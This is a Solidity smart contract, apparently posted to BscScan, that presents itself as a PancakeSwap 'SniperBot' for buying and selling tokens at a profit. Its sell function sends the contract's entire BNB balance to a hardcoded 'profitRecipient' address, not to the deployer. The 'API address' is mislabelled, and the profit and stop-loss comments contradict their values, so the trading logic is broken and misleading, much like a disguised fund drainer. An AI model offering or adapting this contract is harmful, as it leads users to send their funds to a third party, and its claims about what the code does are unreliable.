/**
 *Submitted for verification at BscScan.com on 2023-07-13
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakeApi {
    function getTokenPairInfo(address tokenAddress) external view returns (address pairAddress, uint256 minReceived);
}

interface IPancakeRouter {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (bool);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (bool);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
}

contract SniperBot {
    address private owner;
    address private constant pancakeApiAddress = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73; // PancakeSwap API address
    address private constant pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap router address
    address private constant bnbTokenAddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // BNB token contract address
    address private constant profitRecipient = 0x30c3F41B92Ff50368B052d7Fa5af85c11F5A5D5D; // Profit recipient address
    uint256 private constant bnbAmount = 0.015 ether; // Amount of BNB to trade (in wei)
    uint256 private constant maxGasFeeBNB = 0.01 ether; // Maximum BNB amount to spend on gas fees per transaction
    uint256 private constant targetProfit = 240; // Target profit percentage (105%)
    uint256 private constant stopLoss = 40; // Stop-loss percentage (95%)
    uint256 private buyPrice;
    address private tokenToBuy; // Token address to be bought

    event TradeExecuted(address indexed token, uint256 indexed price);
    event Withdrawal(address indexed token, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function executeTrade(address tokenAddress) external {
        require(msg.sender == owner, "Unauthorized");
        require(tx.gasprice * gasleft() <= maxGasFeeBNB, "Exceeded gas fee limit");

        // Get the PancakeSwap trade details
        (address pairAddress, uint256 minReceived) = getPancakePairInfo(tokenAddress);
        require(pairAddress != address(0), "Invalid token");

        // Swap BNB for the launchpad token
        require(
            IPancakeRouter(pancakeRouterAddress).swapExactETHForTokensSupportingFeeOnTransferTokens{value: bnbAmount}(
                minReceived,
                getPath(bnbTokenAddress, tokenAddress),
                address(this),
                block.timestamp
            ),
            "Trade execution failed"
        );

        // Record the buy price
        buyPrice = getCurrentPrice(pairAddress);

        // Emit event to indicate trade execution
        emit TradeExecuted(tokenAddress, buyPrice);
    }

    function sell(address tokenAddress) external {
        require(msg.sender == owner, "Unauthorized");
        require(tx.gasprice * gasleft() <= maxGasFeeBNB, "Exceeded gas fee limit");

        // Get the PancakeSwap trade details
        (address pairAddress, uint256 minReceived) = getPancakePairInfo(tokenAddress);
        require(pairAddress != address(0), "Invalid token");

        // Calculate target and stop-loss prices
        uint256 targetPrice = (buyPrice * targetProfit) / 100;
        uint256 stopLossPrice = (buyPrice * stopLoss) / 100;

        // Get the current token price
        uint256 currentPrice = getCurrentPrice(pairAddress);

        // Check if the target profit or stop-loss condition is met
        require(currentPrice >= targetPrice || currentPrice <= stopLossPrice, "Sell conditions not met");

        // Approve PancakeSwap router to spend the token
        require(IERC20(tokenAddress).approve(pancakeRouterAddress, IERC20(tokenAddress).balanceOf(address(this))), "Approval failed");

        // Swap the token back to BNB
        require(
            IPancakeRouter(pancakeRouterAddress).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(tokenAddress).balanceOf(address(this)),
                minReceived,
                getPath(tokenAddress, bnbTokenAddress),
                address(this),
                block.timestamp
            ),
            "Trade execution failed"
        );

        // Transfer BNB to the profit recipient
        require(address(this).balance > 0, "No BNB to transfer");
        payable(profitRecipient).transfer(address(this).balance);
    }

    function getCurrentPrice(address pairAddress) internal view returns (uint256) {
        (uint256 reserve0, uint256 reserve1, ) = IPancakePair(pairAddress).getReserves();
        address token0 = IPancakePair(pairAddress).token0();
        uint112 reserveIn;
        uint112 reserveOut;
        if (token0 == bnbTokenAddress) {
            reserveIn = uint112(reserve0);
            reserveOut = uint112(reserve1);
        } else {
            reserveIn = uint112(reserve1);
            reserveOut = uint112(reserve0);
        }
        return (uint256(reserveIn) * 1e18) / uint256(reserveOut);
    }

    function getPath(address tokenIn, address tokenOut) internal pure returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        return path;
    }

    function setTokenToBuy(address tokenAddress) external onlyOwner {
        tokenToBuy = tokenAddress;
    }

    function withdrawBNB(uint256 amount) external {
        require(msg.sender == owner, "Unauthorized");
        require(tx.gasprice * gasleft() <= maxGasFeeBNB, "Exceeded gas fee limit");
        require(amount <= address(this).balance, "Insufficient BNB balance");

        payable(owner).transfer(amount);

        emit Withdrawal(bnbTokenAddress, amount);
    }

    function withdrawAll(address tokenAddress) external {
        require(msg.sender == owner, "Unauthorized");
        require(tx.gasprice * gasleft() <= maxGasFeeBNB, "Exceeded gas fee limit");

        uint256 balance = IERC20(tokenAddress).balanceOf(address(this));
        require(balance > 0, "No tokens to withdraw");

        require(IERC20(tokenAddress).transfer(owner, balance), "Transfer failed");

        emit Withdrawal(tokenAddress, balance);
    }

    function getPancakePairInfo(address tokenAddress) internal view returns (address pairAddress, uint256 minReceived) {
        try IPancakeApi(pancakeApiAddress).getTokenPairInfo(tokenAddress) returns (address _pairAddress, uint256 _minReceived) {
            return (_pairAddress, _minReceived);
        } catch {
            return (address(0), 0);
        }
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Unauthorized");
        _;
    }
}